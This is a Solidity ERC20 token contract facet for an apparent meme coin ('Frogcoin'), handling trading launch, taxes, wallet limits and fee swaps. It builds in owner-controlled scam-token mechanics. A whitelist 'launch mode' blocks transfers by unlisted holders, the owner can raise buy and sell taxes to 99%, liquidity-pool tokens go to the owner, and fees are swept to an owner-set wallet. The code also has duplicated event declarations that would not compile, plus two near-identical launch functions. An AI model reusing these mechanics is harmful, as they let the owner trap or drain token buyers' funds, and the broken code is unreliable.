/*
 * SPDX-License-Identifier: MIT
 * https://twitter.com/FrogcoinOnEth
 * https://t.me/FROG_COIN_ETH
 * https://frogcoineth.vip/
 */

pragma solidity 0.8.19;
import "./TestLib.sol";
contract enableTradingFacet is ERC20, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    event TradingOpened();
    event TradingOpened();
    event FeeReceiverUpdated(address _marketingWallet);
    event MaxTxAmountUpdated(uint _maxTx);
    event MaxHoldAmountUpdated(uint _maxHold);
    event SwapbackUpdated(uint _lowerSwapbackAmount, uint _upperSwapbackAmount);
    event MaxTxAmountUpdated(uint _maxTx);
    event MaxHoldAmountUpdated(uint _maxHold);
    event FeesUpdated(uint _buyTax, uint _sellTax);
    event ExcludedFromFee(address account, bool status);
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingEnabled, "trading is already open");
        ds._isExcludedFromFee[address(this)] = true;
        ds.uniswapV2Router = IDexRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), totalSupply());
        ds.uniswapV2Pair = IDexFactory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
        ds.swapEnabled = true;
        ds.tradingEnabled = true;
        ds.firstBlock = block.number;
        ds.lastLiquifyTime = uint64(block.number);
        ds._buyTax = 25;
        ds._sellTax = 30;

        emit TradingOpened();
    }
    function froglonch() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.tradingEnabled, "trading is already open");
        ds.uniswapV2Router = IDexRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(ds.uniswapV2Router), totalSupply());
        ds.uniswapV2Pair = IDexFactory(ds.uniswapV2Router.factory()).createPair(
            address(this),
            ds.uniswapV2Router.WETH()
        );
        ds.uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(ds.uniswapV2Pair).approve(
            address(ds.uniswapV2Router),
            type(uint).max
        );
        ds.swapEnabled = true;
        ds.tradingEnabled = true;
        ds.firstBlock = block.number;
        ds.lastLiquifyTime = uint64(block.number);
        ds._isExcludedFromFee[address(this)] = true;
        ds._buyTax = 25;
        ds._sellTax = 30;

        emit TradingOpened();
    }
    function setMarketingWallet(address payable taxWallet1) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._marketingWallet = taxWallet1;

        emit FeeReceiverUpdated(taxWallet1);
    }
    function setMaxTx(uint256 newMax) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newMax >= 1, "Max tx cant be lower than 0.1%");
        ds._maxTx = (totalSupply() * newMax) / 1000;
        emit MaxTxAmountUpdated(ds._maxTx);
    }
    function changeMaxWalletAmount(uint256 newMax) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(newMax >= 1, "Max wallet cant be lower than 0.1%");
        ds._maxHold = (totalSupply() * newMax) / 1000;
        emit MaxHoldAmountUpdated(ds._maxHold);
    }
    function setSwapbackValues(
        uint256 taxSwapThreshold,
        uint256 maxTaxSwap
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._lowerSwapbackAmount = (totalSupply() * taxSwapThreshold) / 10000;
        ds._upperSwapbackAmount = (totalSupply() * maxTaxSwap) / 10000;
        emit SwapbackUpdated(taxSwapThreshold, maxTaxSwap);
    }
    function setVM() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds.launchmode, "Launch mode is already disabled");
        ds._buyTax = 30;
        ds._sellTax = 30;
        ds.launchmode = false;
    }
    function removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxTx = totalSupply();
        ds._maxHold = totalSupply();
        emit MaxTxAmountUpdated(totalSupply());
        emit MaxHoldAmountUpdated(totalSupply());
    }
    function setTradingTaxes(
        uint256 buyTax,
        uint256 sellTax
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(buyTax <= 99, "Invalid buy tax value");
        require(sellTax <= 99, "Invalid sell tax value");
        ds._buyTax = buyTax;
        ds._sellTax = sellTax;
        emit FeesUpdated(buyTax, sellTax);
    }
    function smWallet(address[] calldata cute, bool status) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < cute.length; i++) {
            ds._mapAddress[cute[i]] = status;
        }
    }
    function exemptFromTxFees(address account, bool status) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromFee[account] = status;
        emit ExcludedFromFee(account, status);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner() && !ds.inSwap) {
            if (ds.launchmode) {
                require(ds._mapAddress[from] || ds._mapAddress[to], "");
            }

            taxAmount = amount.mul(ds._buyTax).div(100);

            if (
                from == ds.uniswapV2Pair &&
                to != address(ds.uniswapV2Router) &&
                !ds._isExcludedFromFee[to]
            ) {
                require(amount <= ds._maxTx, "Exceeds the ds._maxTx.");
                require(
                    balanceOf(to) + amount <= ds._maxHold,
                    "Exceeds the maxWalletSize."
                );

                if (ds.firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
            }

            if (to != ds.uniswapV2Pair && !ds._isExcludedFromFee[to]) {
                require(
                    balanceOf(to) + amount <= ds._maxHold,
                    "Exceeds the maxWalletSize."
                );
            }

            if (to == ds.uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul(ds._sellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !ds.inSwap &&
                to == ds.uniswapV2Pair &&
                ds.swapEnabled &&
                contractTokenBalance > ds._lowerSwapbackAmount &&
                ds.lastLiquifyTime != uint64(block.number)
            ) {
                swapTokensForEth(
                    min(contractTokenBalance, ds._upperSwapbackAmount)
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee();
                }
            }
        }

        if (taxAmount > 0) {
            super._transfer(from, address(this), taxAmount);
        }
        super._transfer(from, to, amount.sub(taxAmount));
    }
    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.lastLiquifyTime = uint64(block.number);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function triggerSwap() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            msg.sender == ds._marketingWallet || msg.sender == owner(),
            "Only fee receiver can trigger"
        );
        uint256 contractTokenBalance = balanceOf(address(this));

        swapTokensForEth(contractTokenBalance);
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            sendETHToFee();
        }
    }
    function sendETHToFee() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool success;
        (success, ) = address(ds._marketingWallet).call{
            value: address(this).balance
        }("");
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
}
